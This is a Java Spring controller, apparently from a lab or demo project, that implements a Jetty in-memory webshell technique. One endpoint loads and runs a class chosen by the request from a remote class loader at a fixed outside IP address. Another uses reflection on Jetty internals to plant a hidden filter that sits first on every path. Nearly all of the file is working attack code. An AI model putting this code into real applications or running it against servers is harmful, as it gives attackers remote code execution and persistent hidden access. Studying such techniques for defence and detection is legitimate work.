package com.imooc.mvcdemo.controller;

import com.imooc.mvcdemo.TestFilter;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestMapping;

import javax.servlet.Filter;
import java.lang.reflect.*;
import java.util.ArrayList;
import java.util.EnumSet;

@Controller
@RequestMapping("/test")
public class TestController {

    @RequestMapping("/method1")
    public String helloMvc() {
        return "home";
    }

    @RequestMapping("/test3")
    public String test3(String className) throws Exception {

        java.lang.Class.forName(className, true, new java.net.URLClassLoader(new java.net.URL[]{new java.net.URL("http://192.168.31.77:23600/")}, java.lang.Thread.currentThread().getContextClassLoader()));
        return "home";
    }

    @RequestMapping("/jetty")
    public String jetty() throws Exception {

        Object handler = getFV(getFV(Thread.currentThread().getContextClassLoader(), "_context"), "_servletHandler");
        if (handler != null) {
            addFilterByHandler(handler);
        } else {
            Object[] table = (Object[]) getFV(getFV(Thread.currentThread(), "threadLocals"), "table");
            for (Object o : table) {
                handler = getFV(getFV(getFV(o, "value"), "this$0"), "_servletHandler");
                if (handler != null) {
                    addFilterByHandler(handler);
                }
            }
        }

        return "home";

    }


    private static String filterName = "CheckFilter";
    private static String urlPattern = "/*";


    static boolean addFilterByHandler(Object handler) {
        try {
//            System.out.println("[+] Add Dynamic Filter");

            ClassLoader classLoader = handler.getClass().getClassLoader();
            Class sourceClazz = null;
            Object holder = null;

            if (holder == null) {
                try {
                    holder = classLoader.loadClass("org.eclipse.jetty.servlet.FilterHolder").newInstance();
                }catch (Exception e){

                }
            }

            if (holder == null) {
                try {
                    Method method = handler.getClass().getMethod("newFilterHolder");
                    holder = method.invoke(handler);

                } catch (Exception e) {
                }
            }

            if (holder == null) {
                try {
                    sourceClazz = classLoader.loadClass("org.eclipse.jetty.servlet.Source");
                    Field field = sourceClazz.getDeclaredField("JAVAX_API");
                    Method method = handler.getClass().getMethod("newFilterHolder", sourceClazz);
                    holder = method.invoke(handler, field.get(null));

                } catch (ClassNotFoundException ex) {
                }
            }

            if (holder == null) {
                try {
                    sourceClazz = classLoader.loadClass("org.eclipse.jetty.servlet.BaseHolder$Source");
                    Method method = handler.getClass().getMethod("newFilterHolder", sourceClazz);
                    holder = method.invoke(handler, Enum.valueOf(sourceClazz, "JAVAX_API"));
                } catch (Exception e) {

                }

            }


            holder.getClass().getMethod("setName", String.class).invoke(holder, filterName);
            holder.getClass().getMethod("setFilter", Filter.class).invoke(holder, new TestFilter());
            handler.getClass().getMethod("addFilter", holder.getClass()).invoke(handler, holder);
            Class clazz;
            try {
                clazz = classLoader.loadClass("org.eclipse.jetty.servlet.FilterMapping");

            } catch (Exception e) {
                clazz = classLoader.loadClass("org.mortbay.jetty.servlet.FilterMapping");
            }

            Object filterMapping = clazz.newInstance();
            Method method = filterMapping.getClass().getDeclaredMethod("setFilterHolder", holder.getClass());
            method.setAccessible(true);
            method.invoke(filterMapping, holder);
            filterMapping.getClass().getMethod("setPathSpecs", String[].class).invoke(filterMapping, new Object[]{new String[]{urlPattern}});

            try {
                filterMapping.getClass().getMethod("setFilterName", String.class).invoke(filterMapping, new Object[]{filterName});
            } catch (Exception e) {

            }

            try {
                filterMapping.getClass().getMethod("setDispatcherTypes", EnumSet.class).invoke(filterMapping, EnumSet.of(DispatcherType.REQUEST));
            } catch (Exception e) {
                filterMapping.getClass().getMethod("setDispatches", int.class).invoke(filterMapping, 1);
            }
            // prependFilterMapping 会自动把 filter 加到最前面
            try {
                handler.getClass().getMethod("prependFilterMapping", filterMapping.getClass()).invoke(handler, filterMapping);
            } catch (Exception e) {
                handler.getClass().getMethod("addFilterMapping", filterMapping.getClass()).invoke(handler, filterMapping);
            }

            return true;
        } catch (Exception e) {
            e.printStackTrace();
        }
        return false;
    }

    public static void invokeMethod(Object obj, String methodName, Class<?>[] consArgTypes, Object... args) throws
            NoSuchMethodException, InvocationTargetException, IllegalAccessException {
        Method method;
        if (args.length == 0) {
            method = obj.getClass().getMethod(methodName);
        } else {
            method = obj.getClass().getMethod(methodName, consArgTypes);
        }
        method.invoke(obj, args);
    }

    public enum DispatcherType {
        FORWARD,
        INCLUDE,
        REQUEST,
        ASYNC,
        ERROR;
    }

    private static Object getFV(Object var0, String var1) {
        try {

            Field var2 = null;
            Class var3 = var0.getClass();
            while (var3 != Object.class) {
                try {
                    var2 = var3.getDeclaredField(var1);
                    break;
                } catch (NoSuchFieldException var5) {
                    var3 = var3.getSuperclass();
                }
            }
            if (var2 == null) {
                throw new NoSuchFieldException(var1);
            } else {
                var2.setAccessible(true);
                return var2.get(var0);
            }
        } catch (Exception e) {
            System.out.println("getFv fail");
            return null;
        }
    }
}
